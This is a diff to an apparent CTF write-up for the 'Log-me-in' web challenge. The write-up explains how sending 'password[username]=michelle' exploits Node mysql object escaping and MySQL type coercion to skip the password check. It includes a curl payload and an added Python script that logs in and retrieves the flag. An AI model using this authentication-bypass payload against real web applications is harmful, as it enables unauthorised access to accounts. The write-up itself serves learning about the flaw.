@@ -172,7 +172,7 @@ app.post('/login', (req, res) => {
 
 # Exploitation
 
-As soon as you look at the source code, you'll notice the following snippet:
+When you look at the source code, you'll notice the following snippet:
 
 ```js
 app.use(bodyParser.urlencoded({
@@ -201,7 +201,7 @@ const sql = 'Select * from users where username = ? and password = ?';
 con.query(sql, [u, p], function(err, qResult) {...});
 ```
 
-Now, we'll see how passing an object might help us, by referring to the `mysql` [docs](https://www.npmjs.com/package/mysql#escaping-query-values).
+Now, let's see if passing an objectto the `con.query` function might help us. We'll refer to the official `mysql` [docs](https://www.npmjs.com/package/mysql#escaping-query-values).
 
 Take a look at this example:
 
@@ -214,7 +214,7 @@ var query = connection.query('INSERT INTO posts SET ?', post, function (error, r
 console.log(query.sql); // INSERT INTO posts SET `id` = 1, `title` = 'Hello MySQL'
 ```
 
-We can see that objects are converted into comma separated attributes. We know the username is supposed to be `michelle`, but we do not know the password. So, we can try to pass an object in the place of password, with a known attribute. So, here's the payload I tried:
+We can see that objects are converted into comma separated attributes. We know that the username is supposed to be `michelle`, but we do not know the password. So, we can try to pass an object in the place of password, with a known attribute. Here's the payload I tried:
 
 ```
 csrf&username=michelle&password[username]=michelle
@@ -224,7 +224,7 @@ This makes `password` an object as shown below:
 
 ```js
 {
-    username: 'michelle'
+  username: 'michelle',
 }
 ```
 
@@ -239,11 +239,17 @@ This actually evaluates to:
 ```js
 "Select * from users where username = 'michelle' and password = `username` = 'michelle';"
 ```
-Now, this works because of the way `mysql` evaluates strings. When you evaluate `'password' = 'username'`, it returns a 0. Now, when you compare `0` and `'michelle'`, `true` is returned. This happens because of the way type-casting is done in `mysql`. 
 
-This would work for any string which does not get type-casted to a different number. For example, `0 = '1michelle'` will evaluate to false, and not allow you to log in successfully. Check out [this](https://stackoverflow.com/questions/22080382/mysql-why-comparing-a-string-to-0-gives-true) link for a more detailed explanation.
+This works because of the way `mysql` evaluates strings. When you evaluate `'password' = 'username'`, it returns a 0. Then, if you compare `0` and `'michelle'`, `true` is returned. This happens because of the way type-casting is done in `mysql`. 
+<br />
 
-This will bypass the password check and give you back the required user! Here's the final paylaod.
+This exploit would work for any string (not just `michelle`) except the ones which get type-casted to a different number.
+<br />
+
+For example, `0 = '1michelle'` will evaluate to false, since `1michelle` when converted to an integer gives `1`. Therefore, `password[username] = 1michelle` will not allow you to log in successfully. Check out [this](https://stackoverflow.com/questions/22080382/mysql-why-comparing-a-string-to-0-gives-true) link for a more detailed explanation.
+<br />
+
+Here's the final paylaod.
 
 ```bash
 curl -i -X POST --data 'csrf&username=michelle&password[username]=michelle' "https://log-me-in.web.ctfcompetition.com/login"
@@ -263,8 +269,40 @@ content-length: 25
 Found. Redirecting to /me
 ```
 
-Now, take the cookie you received and visit `/flag`.
+From here, you can just take the cookie you received, and use that to visit `/flag`.
 <br />
+
+P.S. you can write a python script for the exploit, like the one given below:
+
+```py
+import requests
+import re
+
+url = lambda path: 'https://log-me-in.web.ctfcompetition.com' + path
+
+s = requests.Session()
+
+payload = {
+    "username": "michelle",
+    "password[username]": "michelle",
+    "csrf": "",
+}
+
+r = s.post(url('/login'), data=payload)
+
+r = s.get(url('/flag'))
+
+if re.search(r'CTF{.*}', r.text):
+    print(r.text)
+
+```
+
+You can run this script and use `grep` to find the flag.
+
+```bash
+$ python solve.py | grep CTF
+        <p>Flag: CTF{a-premium-effort-deserves-a-premium-flag}</p>
+```
 
 The flag is:
 
